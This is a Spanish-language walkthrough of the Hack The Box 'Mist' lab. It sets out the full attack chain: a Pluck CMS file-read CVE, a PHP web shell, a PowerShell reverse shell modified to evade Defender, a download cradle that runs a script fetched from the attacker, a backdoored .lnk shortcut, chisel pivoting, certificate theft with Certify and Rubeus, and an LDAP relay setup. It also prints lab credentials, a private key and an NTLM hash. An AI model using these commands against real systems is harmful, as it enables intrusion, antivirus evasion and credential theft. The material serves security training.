---
layout: single
title: write up Mist HTB
excerpt:
date: 2025-1-10
classes: wide
header:
  teaser: https://404zzero.github.io/zzero.github.io//assets/images/Mist/Mist_avatar.png
  teaser_home_page: true
categories:
  - hacking
  - windows
  - Active Directory
  - kerberos
  - Proxychains
  - hash ntml
  - mimikat
  - rubeos
  - bypass
  - Mejor maquina AD
  - TENGO QUE ESTUDIARMELA
tags:  
  - hacking
  - windows
  - Active Directory
  - kerberos
  - Proxychains
  - hash ntml
  - mimikat
  - rubeos
  - bypass
  - Mejor maquina AD
  - TENGO QUE ESTUDIARMELA
---

Mist es una maquina de la maxima dificultad. esta maquina enseña como ganar acceso a una maquina en un entorno Active directory para despues pivoterar y comprometer la maquina *domain controller*. para lo cual vamos a usar pivoting, bypass de el defender, relay attacks, petitPotam, pass the hash, obtencion de certificados, tikets para kerberos etc

**RESALTAR QUE GUSTO CUANDO ESTOY ESCRIBIENDO ESTO (9/11/24 A LAS 19:54) LA MAQUINA A SIDO RETIRADA DEL PLAN GRATUITO Y PUES SOLO ME A DADO TIEMPO A COMPLETARLA UNA VEZ**
![](https://404zzero.github.io/zzero.github.io//assets/images/Mist/Pastedimage20241109195659.png)
![](https://404zzero.github.io/zzero.github.io//assets/images/Mist/Pastedimage20241109195727.png)
**AQUI PRUEVAS DE ELLO POR LO QUE NO E TENDO TIEMPO PARA COMPLETARLA UNA SEGUDA VEZ PARA MIS APUNTES Y EL WRITE UP POR LO QUE NO VA A VER NIGUNA CAPTURA Y SI HAY ES DE OTRO WRITE UP QUE ALLA PILLADO**

lo primero va a ser un nmap como siempre 
```bash
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 10.10.11.17 -oG allports
<snip>
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 126
<\snip>
```

```bash
nmap -sVC -p80 10.10.11.17 -oN target
Nmap scan report for 10.10.11.17
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
| http-title: Mist - Mist
|_Requested resource was http://10.10.11.17/?file=mist
|_http-generator: pluck 4.7.18
| http-robots.txt: 2 disallowed entries
|_/data/ /docs/
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.84 seconds
```
el escaneo ya nos chiva algo de info. es un servicio apache 2.4.52 y hay un gestor de contenido pluck v4. 7. 18

si vamos a a http://10.10.11.17 veremos de primeras lo siguiente:
![](https://404zzero.github.io/zzero.github.io//assets/images/Mist/Mist_1.png)
vale este es el panel de pluck. 
si vemos abajo pone admin  si le pinchamos sale un panel de login
vale puestoas aqui si nos ponemos a investigar descubrimos el siguiente CVE:

CVE-2024-9405
https://nvd.nist.gov/vuln/detail/CVE-2024-9405

basicamente lo que dice el CVE es que nos permite leer archivo en remoto por lo que puede aver filtraciones de datos

si buscamos mas sobre el CVE descubrimos que por ejemplo una ruta a probar para ver si hay filtracion es la siguiente /data/modules/albums/albums_getimage.php

por lo que vamos a provarla:
```bash
curl -I -s 'http://10.10.11.17/data/modules/albums/albums_getimage.php'
HTTP/1.1 200 OK
Date: Sun, 27 Oct 2024 06:46:42 GMT
Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
X-Powered-By: PHP/8.1.1
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Content-Type: image/jpeg
```

 bump tenemos 200 por lo que tenemos acceso

por lo que segun la informacion del CVE si hago lo siguiente deveria ver el contenido:
```bash
curl -s http://10.10.11.17/data/settings/ | html2text

****** Index of /data/settings ******
`ICO`       Name                 Last modified    Size Description
===========================================================================
`PARENTDIR` Parent Directory                         -  
`   `       install.dat          2024-02-19 16:12    0  
`TXT`       langpref.php         2024-02-19 16:11   30  
`DIR`       modules/             2024-10-26 23:48    -  
`TXT`       options.php          2024-02-19 16:11   56  
`DIR`       pages/               2024-10-26 23:48    -  
`TXT`       pass.php             2024-02-19 16:32  146  
`TXT`       themepref.php        2024-02-19 16:11   32  
`TXT`       token.php            2024-02-19 16:10  149  
`TXT`       update_lastcheck.php 2024-02-24 04:58   78  
===========================================================================
     Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 Server at 10.10.11.17
     Port 80
```

y bump lo tenemos

si nos ponemos a mirar por los directorios encontramos /data/settings/modules/albums que tiene algo interesante 

```bash
curl -s http://10.10.11.17/data/settings/modules/albums/ | html2text

****** Index of /data/settings/modules/albums ******
`ICO`       Name             Last modified    Size Description
===========================================================================
`PARENTDIR` Parent Directory                     -  
`TXT`       admin_backup.php 2024-02-19 16:32  146  
`TXT`       mist.php         2024-02-19 16:23   30  
`DIR`       mist/            2024-10-26 23:51    -  
===========================================================================
     Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 Server at 10.10.11.17
     Port 80
```

vemos que hay un admin_backup.php

si nos lo descargamos con wget:
```bash
 wget http://10.10.11.17/data/settings/modules/albums/admin_backup.php
```

si intentamos ver el contenido veremos que esta vacio 

```bash
file admin_backup.php

admin_backup.php: empty
```

pero solo a nostros. porque dijo esto? porque si investigamos la ruta /data/modules/albums/albums_getimage.php en internet descubrimos que podemos leer archivo atraves de el

por lo que podemos hacer lo siguiente:

```bash
curl -s 'http://10.10.11.17/data/modules/albums/albums_getimage.php?image=admin_backup.php'

<?php
$ww = 'c81dde783f9543114ecd9fa14e8440a2a868bfe0bacdf14d29fce0605c09d5a2bcd2028d0d7a3fa805573d074faa15d6361f44aec9a6efe18b754b3c265ce81e';
?>146
```

obtenemos un hash
vamso a identificarlo con hash-identifier:

```bash
hash-identifier

<SNIP>
 HASH: c81dde783f9543114ecd9fa14e8440a2a868bfe0bacdf14d29fce0605c09d5a2bcd2028d0d7a3fa805573d074faa15d6361f44aec9a6efe18b754b3c265ce81e

Possible Hashs:
[+] SHA-512
[+] Whirlpool
```

tiene pinta de ser un un hash SHA-512

por lo que lo metemos en un archivo y lo pasamos por john:
```bash
jhon --wordlist /usr/share/wordlists/rockyou.txt admin_backup_hash --format=Raw-SHA512

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 256/256 AVX2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=5
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
lexypoo97        (?)
1g 0:00:00:00 DONE (2024-10-27 04:01) 2.380g/s 2108Kp/s 2108Kc/s 2108KC/s lion4ever..leaps
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

vemos que la contraseña es lexypoo97

ahora dimplemente la ponemos en el panel de admin y ale listo estamos

lo primero que vamos a intentar es instalar modulos. para ello vamos a options y manage modules y al entrar veremos lo siguiente:
![](mist_3.png)
en la esquina superior derecha aparece un boton para instalar modulos por lo que le damos

ahora toca crear un modulo malicioso para ello vamos a tener que hacerlo de la siguiente forma:
1. creamos un archivo php que contenga lo siguiente:
   ```php
   <?php system($_REQUEST['cmd']); ?>
   ```
2. creamos un directorio llamado shell (lo puedes llamar como quieras)
   ```bash
   mkdir shell
   ```
3. movemos el archivo php a dentro del directorio 
4. lo comprimimos en un .zip
   ```bash
   zip -r shell.zip shell
   ```


ahora donde pone browse simplemente selecionamos shell.zip y lo subimos

(NOTA: los modulos se reinician cada un x tiempo y hay que volver a subirlos)

por lo que si todo a salido bien si hacemos el sigiente curl deveriamos ver una carpeta shell

```bash
curl -s 'http://10.10.11.17/data/modules/' | html2text
****** Index of /data/modules ******
`ICO`       Name             Last modified    Size Description
===========================================================================
`PARENTDIR` Parent Directory                     -  
`DIR`       albums/          2024-10-27 00:15    -  
`DIR`       blog/            2024-10-27 00:15    -  
`DIR`       contactform/     2024-10-27 00:15    -  
`DIR`       multitheme/      2024-10-27 00:15    -  
`DIR`       shell/           2024-10-27 00:15    -  
`DIR`       tinymce/         2024-10-27 00:15    -  
`DIR`       viewsite/        2024-10-27 00:15    -  
===========================================================================
     Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 Server at 10.10.11.17
     Port 80

```

vale pues vamos a ver si tenemos ejecucion remota 

```bash
curl -s 'http://10.10.11.17/data/modules/shell/shell.php?cmd=whoami'

ms01\svc_web
```

y tenemos ejecucion remota por loq ye vamos a usar una revshell

mas especificamente esta 
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1

lo unico hay qu hacerle unas modificaciones para bypasear windows defende,
las modifcaciones consisten en poner todo en su diminutivo aqui os dejo la comparativa:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.89',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```

```powershell
$c = New-Object System.Net.Sockets.TCPClient('10.10.16.89',9001);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2  = $sb + 'PS ' + '> ';$sby = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()
```

tambien para evitar el defender podemos usar un servidor python externo y asi quitarnos mas problemas. tendriamos que hacer una peticion en get a nuestro servidor atacante para que la maquina victima descarge la revershell y asi ganar acceso

para esto primero tenemos que crear el payload para que ejecute la accion y tenemos que encodearlo en utf-16le y segido de otro encodeado en base64

```bash
echo -n 'IEX(New-Object Net.WebClient).downloadString("http://10.10.16.89:8000/rev.ps1")' | iconv -t utf-16le | base64 -w0 ; echo

SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADgAOQA6ADgAMAAwADAALwByAGUAdgAuAHAAcwAxACIAKQA=
```

vale pues una vez echo esto levantamos el servidor python en el directorio donde esta la rever
```bash
sudo python3 -m http.server 8000
```

nos ponemos en escucha con netcat:
```bash
rlwrap -cAr nc -lvnp 9001
```

y hazemos la siguiente peticion en:
```bash
curl 'http://10.10.11.17/data/modules/shell/shell.php' --data-urlencode 'cmd=powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADgAOQA6ADgAMAAwADAALwByAGUAdgAuAHAAcwAxACIAKQA='
```

```bash
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.17] 49872
whoami

ms01\svc_web
PS > whoami
```

y estamos dentro

si nos vamos a la raiz veremos un directorio raro para una raiz
common Applications, en el hay 3 aplicaciones .lnk

```bash
dir C:\"Common Applications"


    Directory: C:\Common Applications


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/8/2021   1:15 AM           1118 Calculator.lnk
-a----          5/7/2021   3:14 PM           1175 Notepad.lnk
-a----          5/7/2021   3:15 PM           1171 Wordpad.lnk

PS > cd C:\"Common Applications"
```

vale los .lnk se pueden modificar para que sean maliciosos por lo que vamos a modificar un poco el de la calculadora:
1. 
   ```bash
   $objShell = New-Object -ComObject WScript.Shell
   ```
2. 
   ```bash
   $lnk = $objShell.CreateShortcut("c:\common Applications\Calculator.lnk")
   ```
3. 
   ```bash
   $lnk.TargetPath = "c:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
   ```
4. 
   ```bash
   $lnk.arguments = "-Nop -sta -noni -w hidden -encodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADgAOQA6ADgAMAAwADAALwByAGUAdgAuAHAAcwAxACIAKQA="
   ```
5. 
   ```bash
   $lnk.save()
   ```

vale ahora tenemos que ser rapidos y mantener el servidor python encendido y ponernos en escucha otra vez

pasado un rato ganaremos acceso como 

```bash
mist\brandon.keywarp
```

(NOTA: cada vez que el usuario mist\brandon.keywarp nos da la shell se restableze el .lnk malicioso por lo que hay si la perdemos hay que reacerlo)

(NOTA: recomiendo rehacer el proceso 3 veces para tener 3 shell, se entiende el porque mas adelante)

algo curioso es que los usuarios tienen el prefijo mist pero en el escaneo de nmap solo a aparecido el puerto 80 y nada de active directory

si hacemos un ipconfig:
```cmd
shell-session
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.100.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.100.100

```

vemos que nustra ip actual es la 192.168.100.101
vamos a probar a hacer un nslookup al dominio mist.htb aver que sale:

```cmd
nslookup mist.htb

DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  192.168.100.100

Name:    mist.htb
Addresses:  192.168.100.100
          10.10.11.17
```

vale tenemos una ip mas la .100

investigando por internet descubri que esta maquina en la que estoy se llama MS01 y la Domain Controller DC01

vamos a comprobar esto

```cmd
nslookup ms01.mist.htb
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  192.168.100.100

Name:    ms01.mist.htb
Address:  192.168.100.101
```

```cmd
nslookup dc01.mist.htb
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  192.168.100.100

Name:    dc01.mist.htb
Addresses:  192.168.100.100
          10.10.11.17
```

vale era correcta esa info
y segun esa info si hago un ipconfig /all:

```cmd
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : MS01
   Primary Dns Suffix  . . . . . . . : mist.htb
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : mist.htb

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Microsoft Hyper-V Network Adapter
   Physical Address. . . . . . . . . : 00-15-5D-16-CB-07
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 192.168.100.101(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.100.100
   DNS Servers . . . . . . . . . . . : 192.168.100.100
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

pues si estamos en una maquina virtual

vale nos vamos a hacer un tunel con chisel
para ello vamos a necesitar descargar el chisel para linux y para windows en la maquina atacante y despues por server python pasar el de windows a la maquina victima

```cmd
 cd C:\Users\Public\Downloads
```

y de hay nos pasamos a hacer un wget para descarganos el chisel

```cmd
wget http://10.10.16.89:8000/chisel_windowsx64.exe -UseBasicParsing -OutFile .\chisel.exe
```

vale ahora en la maquina atacante ejecutamos el chisel en modo servidor por el puerto 1234

```bash
./chisel_linux_amd64 server --reverse -v -p 1234 --socks5
```

y en la maquina victima:

```cmd
.\chisel.exe client -v 10.10.16.82 R:socks
```

(NOTA: PORFAVOR ACUERDATE DE AÑADIR LAS CONFIGURACIONES DEL SOCK A PROXYCHAINS QUE SINO NO FUNCIONA Y DESPUES TE RAYAS Y LLORAS)

ahora añadimos todos los dominios y ips a el etc/hosts:

```bash
echo -e '192.168.100.100 MIST.HTB DC01 DC01.MIST.HTB\n192.168.100.101 MS01 MS01.MIST.HTB' | sudo tee -a /etc/hosts
```

y de hay con netexec junto a proxychains vamos a ver si vemos el dominio MIST.HTB y tambien la mquina DC01

```bash
proxychains4 nxc smb MIST.HTB

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.100.100:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.100.100:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  192.168.100.100:135  ...  OK
SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
```
y emos podido pivotear juju 
perfect ahora dessde la maquina victima vamos a intentar obtener informacion del dominio con la herramienta SharpHound (para subirlo el mismo procedimiento de server python)

```cmd
.\SharpHound -c all
```

una vez echo debería de generar un archivo .zip, donde además he traspasado un binario de netcat a la máquina víctima el cual usaré para pasar el archivo .zip desde la mqaquina víctima a nuestra máquina de atacante:

```cmd

dir


    Directory: C:\Users\Public\Downloads


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/27/2024   8:50 PM          37068 20241027205031_BloodHound.zip
-a----        10/27/2024   7:58 PM        9760768 chisel.exe
-a----        10/27/2024   8:55 PM          45272 nc.exe
-a----        10/27/2024   8:48 PM        1556992 SharpHound.exe
-a----        10/27/2024   8:50 PM           1900 ZDQ3NjQ4ZjUtMzZkMS00MDM4LWIyZmItNjA0NTAwZGUyZDAz.bin

```

en la maquina atacante nos ponemos en escucha para recibir los datos:
```bash
nc -lvnp 4678 > 20241027205031_BloodHound.zip
```

y en la victima:

```cmd
cmd.exe /c "C:\Users\Public\Downloads\nc.exe 10.10.16.82 4678 < C:\Users\Public\Downloads\20241027205031_BloodHound.zip"
```

y ahora subimos el archivo a bloodhunt para ver la estructura

![](mist_5.png)

vemos que el usuario puede solicitar certificados
pero el defender nos jode bastante por lo que hay buscar algun directorio que este en la "lista blanca"
segun chatgpt este cmando me deveria dar los directorios:
```cmd
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -FilterXPath "*[System[(EventID=5007)`" | Where-Object { $_.Message -like "*exclusions\Path*"} | Select-Object Message | FL


Message : Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review the
          settings as this may be the result of malware.
                Old value:
                New value: HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\xampp\htdocs = 0x0
```
y vemos que el directorio c:\xampp\htdocs es lista blanca

por lo vamos a ese directorio y descargamos el certify.exe mediante server python

```cmd
wget http://10.10.16.82:8000/Certify.exe -Outfile .\Certify.exe
```

y lo ejecutamos

```cmd
.Certify.exe find /vulnerable

```shell-session
[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=mist,DC=htb'

[*] Listing info about the Enterprise CA 'mist-DC01-CA'
```

pues valla no a encontrado nada
pues vamos a intentar conseguir el certificado del usuario brandon.keywarp y ya de hay tirar de rubeus para conseguir el hash

```cmd
.Certify.exe request /ca:DC01\mist-DC01-CA /template:User

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAxjitGPAAl3eCbfWgGl2SGlB4hlhpE/83AySd1LQT8fs+oFMv
VjxLiDkGSaTXUUHHdtTRnnBFUf3lWoUPs9psQkJNwlE1jcbqxd9QLIc9a44lZeCY
eLHCJ3xaXnh02GyfwzKZ3IYq3nkyHk3VVyv+ZIOS5Cpu3d/NbFZNFn5ttZJkXz6C
Wbj6xmwgRJDC++snn89ZZZNj6ifLfXPna+e9tfs5jm+RxVcUTDIF6K0Cd28py+Rj
8mxebQa9PmRg3M5IO4Tk7uPCQ6U0tjMw2fwLX64g5U2RU+8LfspA/euBOmbAJzi2
xKFzv+zdTVKXL5ACXp0hRb9ZWM0FQdjPcT2vWQIDAQABAoIBAFvRIvUbLtr6Y7M1
hIzR7Pw9bCamyz2VCVFuY6GELHz5KSAwiAvE8CPQbkYskgQ0mQVFPTfLv4BkQBn2
6rgfo+fpOIWbAliC3Hr9nvCRUHUCqfYP2/CEPm/13RJHb7BUWIidZsHMcA0PTJTW
7sxrN3IttBv2P9aMdWYKb7jMpVrl+2h9EAu1yzpGfSkOAJo/f9ul/8K3LVgZc7Fb
lbAr5U8ciOfGzeRIf087TZo+WyDIqk7rHCF9qIJ9Lcxtri7H/QjuIV1X66cYW8Pp
sAQCLAnCEfa+Vogm6BtBT62n7DpRZjK5rc+UDYT00iBC63RvKI1T8q5bVkTp0Mx8
NBhGzXUCgYEAyAzKBc2JnXtwKqExiCDNNwh79vP+PfoRjB4ZKhJH0OR4axRkuyCF
fXQhMIJ1O22wNtCPjdzOEruV+FgH3UVg8nxFAaRQVKaP8NAUI7f02f2yRRk02JA1
hUuvMspzv/+03OrWVel/ecbGy+KuIaZ0AIHlEfMHqfG1Tr40kA03QGsCgYEA/aj3
CppjM9X2TkXMWwaQFE20/itlO0M0PtNwxk7XqbvmB2Nm+LiDzo336mA9P1Mumd2T
iPoE24qrFK3dY98Fixps8VqA3gIcLnOY+//qRHNHaXkQGdUcHK0nFwOHl8mexAY8
tk4iagWtX+BXVV6EhpfcBsT+IQbN2/zkFr1dcEsCgYBYQ+xPKyTw6ynOZVjpay+g
fInVqEohJljfrdgEjBRLwsKu3Eylk+/SLo8GTElVc0wwo0zzlt0FvuaosI6nvpjL
5LC9zLX045jW87gvGldaZ2lku35pnxc+POqMSm9P4471elgfh+rK3D2Sb+3Mwxij
sKxVgxl6jj8lAx9F/87FCQKBgFY4DGBqQbXo0COizedSv75m+1I5ZdtS6HtCW17M
hbmHyJRSUTnRXdvjnZToyWiw2XIrQm6YrPYCmEwbHNlJgRTbEpSm8o6DoRiY6jMd
tX82v9s17ycYrMmCgXrtFDWfrntqs1A0FrZ634drNcQqsFkfXQZgBxEqwuY3ez/P
decpAoGAKED48/u3JGqNXHQjAlJscZ5jmReBgTnA/e/fUEm9Yj9M3TG7Ad3S0pyJ
m6ShyIDV0O0bZAFDxixQlGq9aMQBPxOpEY4Zkgq0372n2ErtepzRazRMEDk8r+qm
tI9IeYGAo2GgpH+yjgLchicMJGzqm0DN+qCRvK/TXllry6ghs14=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGDzCCBPegAwIBAgITIwAAADy1VlSfaKP7iQAAAAAAPDANBgkqhkiG9w0BAQsF
ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEbWlzdDEV
MBMGA1UEAxMMbWlzdC1EQzAxLUNBMB4XDTI0MTAyODA1MjgxNVoXDTI1MTAyODA1
MjgxNVowVTETMBEGCgmSJomT8ixkARkWA2h0YjEUMBIGCgmSJomT8ixkARkWBG1p
c3QxDjAMBgNVBAMTBVVzZXJzMRgwFgYDVQQDEw9CcmFuZG9uLktleXdhcnAwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDGOK0Y8ACXd4Jt9aAaXZIaUHiG
WGkT/zcDJJ3UtBPx+z6gUy9WPEuIOQZJpNdRQcd21NGecEVR/eVahQ+z2mxCQk3C
UTWNxurF31Ashz1rjiVl4Jh4scInfFpeeHTYbJ/DMpnchireeTIeTdVXK/5kg5Lk
Km7d381sVk0Wfm21kmRfPoJZuPrGbCBEkML76yefz1llk2PqJ8t9c+dr5721+zmO
b5HFVxRMMgXorQJ3bynL5GPybF5tBr0+ZGDczkg7hOTu48JDpTS2MzDZ/AtfriDl
TZFT7wt+ykD964E6ZsAnOLbEoXO/7N1NUpcvkAJenSFFv1lYzQVB2M9xPa9ZAgMB
AAGjggLpMIIC5TAXBgkrBgEEAYI3FAIECh4IAFUAcwBlAHIwKQYDVR0lBCIwIAYK
KwYBBAGCNwoDBAYIKwYBBQUHAwQGCCsGAQUFBwMCMA4GA1UdDwEB/wQEAwIFoDBE
BgkqhkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAw
BwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFPHsfVguJnqC9Lcq6hASXu/m
XYx9MB8GA1UdIwQYMBaAFAJHtA9/ZUDlwTbDIo9S3fMCAFUcMIHEBgNVHR8Egbww
gbkwgbaggbOggbCGga1sZGFwOi8vL0NOPW1pc3QtREMwMS1DQSxDTj1EQzAxLENO
PUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
b25maWd1cmF0aW9uLERDPW1pc3QsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlv
bkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBuwYI
KwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1taXN0LURD
MDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9bWlzdCxEQz1odGI/Y0FDZXJ0aWZpY2F0
ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwMwYDVR0R
BCwwKqAoBgorBgEEAYI3FAIDoBoMGEJyYW5kb24uS2V5d2FycEBtaXN0Lmh0YjBP
BgkrBgEEAYI3GQIEQjBAoD4GCisGAQQBgjcZAgGgMAQuUy0xLTUtMjEtMTA0NTgw
OTUwOS0zMDA2NjU4NTg5LTI0MjYwNTU5NDEtMTExMDANBgkqhkiG9w0BAQsFAAOC
AQEAVXtiE7XEVqV2V/m9poIurrQokMq5rywlOAS7yvRIdwfQB3sBegP0I5RI0hue
Fw5x81V1IBEcVv4BQUpmQMXWvtvIkHFpbZ/VZU+pki16Wwkrk2eHxfraFUaslUEI
SXxcBX1f46wj2eWETDAUOVS4hu8yjHZiD9T8+CAWzVHRKsPaMd2e2anAbg+3SJLE
X9M/AUkwKo5b1dB1KLAzF8j6sXdCPrqDCuzBL14UaJATvZK96cg4Uaa4IlAxtwuW
neoaIhCPRNIkKe1qi4m4tRkSbx0bBzSaL1575eT6g8Gqzi7w3FkUkw/aTfeEzSJE
iFuZxwxjrqeGe9+xlKFWLVueMA==
-----END CERTIFICATE-----
```

y me las da

por lo que nos lo copiamos en un archivo a la maquina atacante y con openssl para generar un nuevo certificado sin contraseña:
```bash
openssl pkcs12 -in brandom_keywarp.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out brandon_keywarp_cert.pfx 
```

vale ahora a la maquina victima tenemos que pasarle Rubeus.exe y el archivo brandon_keywarp_cert.pfx al directorio c:\xampp\htdocs y hay ejecutar de esta forma
```cmd
.\Rubeus.exe asktgt /user:brandon.keywarp /certificate:brandon_keywarp_cert.pfx /getcredentials /show /nowrap

<SNIP>
   NTLM              : DB03D6A77A2205BC1D07082740626CC9
```

lo tenemos

reisamos que el hash funcione 

```bash
proxychains4 -q nxc smb MS01.MIST.HTB -u 'brandon.keywarp' -H 'DB03D6A77A2205BC1D07082740626CC9'

SMB         224.0.0.1       445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:mist.htb) (signing:False) (SMBv1:False)
SMB         224.0.0.1       445    MS01             [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9

```

```bash
proxychains4 -q nxc smb DC01.Mist.HTB -u 'brandon.keywarp' -H 'DB03D6A77A2205BC1D07082740626CC9'

SMB         224.0.0.1       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
SMB         224.0.0.1       445    DC01             [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9

```

y vemos que esta bien

vale pues vamos a ver si la data enviada a traves de LDAP esta firmada 

```bash
proxychains4 -q nxc ladap DC01.MIST.HTB -u 'brandon.keywarp' -H 'DB03D6A77A2205BC1D07082740626CC9' -M ldap-checker


SMB         224.0.0.1       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
LDAP        224.0.0.1       389    DC01             [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9
LDAP-CHE... 224.0.0.1       389    DC01             LDAP Signing NOT Enforced!
LDAP-CHE... 224.0.0.1       389    DC01             LDAPS Channel Binding is set to "NEVER"
```

bueno entonces podemos hacer un Relay Attack pero bastante jodido la verdad

lo primero es hacer un segundo tunel con chisel (por esto lo de al menos 3 terminales) sin matar el otro

creamos un nuevo túnel (básicamente un Local Port Forwarding) entre el puerto 5050 de la máquina MS01 y el puerto 80 de nuestra máquina de atacante usando nuevamente Chisel. Creamos una nueva terminal como el usuario brandon.keywarp y en aquella terminal volvemos a ejecutar Chisel:

```cmd
.\chisel.exe client -v 10.10.16.82:1234 5050:127.0.0.1:80

```

ahora necesitamos una version especial de Impacket que se descarga asi en nuestra maquina atacante:
```bash
git clone https://github.com/Tw1sm/impacket -b interactive-ldap-shadow-creds
```

ahora importante toda la instalacion se deve hacer como root:
```bash
cd impacket

python3 -m venv .venv_impacket

source .venv_impacket/bin/activate

pip3 install .
```

